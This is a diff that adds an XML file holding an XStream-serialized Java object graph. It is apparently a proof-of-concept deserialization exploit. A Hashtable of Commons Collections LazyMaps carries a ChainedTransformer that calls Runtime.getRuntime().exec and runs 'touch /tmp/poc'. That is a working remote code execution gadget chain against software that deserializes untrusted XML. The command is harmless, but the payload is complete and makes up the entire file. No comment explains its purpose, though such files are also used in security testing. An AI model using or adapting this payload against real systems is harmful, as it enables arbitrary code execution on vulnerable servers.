@@ -1,0 +1,76 @@
+<hashtable>
+  <entry>
+    <org.apache.commons.collections.map.LazyMap serialization="custom">
+      <unserializable-parents/>
+      <org.apache.commons.collections.map.LazyMap>
+        <default>
+          <factory class="org.apache.commons.collections.functors.ChainedTransformer">
+            <iTransformers>
+              <org.apache.commons.collections.functors.ConstantTransformer>
+                <iConstant class="java-class">java.lang.Runtime</iConstant>
+              </org.apache.commons.collections.functors.ConstantTransformer>
+              <org.apache.commons.collections.functors.InvokerTransformer>
+                <iMethodName>getMethod</iMethodName>
+                <iParamTypes>
+                  <java-class>java.lang.String</java-class>
+                  <java-class>[Ljava.lang.Class;</java-class>
+                </iParamTypes>
+                <iArgs>
+                  <string>getRuntime</string>
+                  <java-class-array/>
+                </iArgs>
+              </org.apache.commons.collections.functors.InvokerTransformer>
+              <org.apache.commons.collections.functors.InvokerTransformer>
+                <iMethodName>invoke</iMethodName>
+                <iParamTypes>
+                  <java-class>java.lang.Object</java-class>
+                  <java-class>[Ljava.lang.Object;</java-class>
+                </iParamTypes>
+                <iArgs>
+                  <null/>
+                  <object-array/>
+                </iArgs>
+              </org.apache.commons.collections.functors.InvokerTransformer>
+              <org.apache.commons.collections.functors.InvokerTransformer>
+                <iMethodName>exec</iMethodName>
+                <iParamTypes>
+                  <java-class>java.lang.String</java-class>
+                </iParamTypes>
+                <iArgs class="string-array">
+                  <string>touch /tmp/poc</string>
+                </iArgs>
+              </org.apache.commons.collections.functors.InvokerTransformer>
+              <org.apache.commons.collections.functors.ConstantTransformer>
+                <iConstant class="int">1</iConstant>
+              </org.apache.commons.collections.functors.ConstantTransformer>
+            </iTransformers>
+          </factory>
+        </default>
+        <map>
+          <entry>
+            <string>zZ</string>
+            <int>1</int>
+          </entry>
+        </map>
+      </org.apache.commons.collections.map.LazyMap>
+    </org.apache.commons.collections.map.LazyMap>
+    <int>2</int>
+  </entry>
+  <entry>
+    <org.apache.commons.collections.map.LazyMap serialization="custom">
+      <unserializable-parents/>
+      <org.apache.commons.collections.map.LazyMap>
+        <default>
+          <factory class="org.apache.commons.collections.functors.ChainedTransformer" reference="../../../../../entry/org.apache.commons.collections.map.LazyMap/org.apache.commons.collections.map.LazyMap/default/factory"/>
+        </default>
+        <map>
+          <entry>
+            <string>yy</string>
+            <int>1</int>
+          </entry>
+        </map>
+      </org.apache.commons.collections.map.LazyMap>
+    </org.apache.commons.collections.map.LazyMap>
+    <int>1</int>
+  </entry>
+</hashtable>
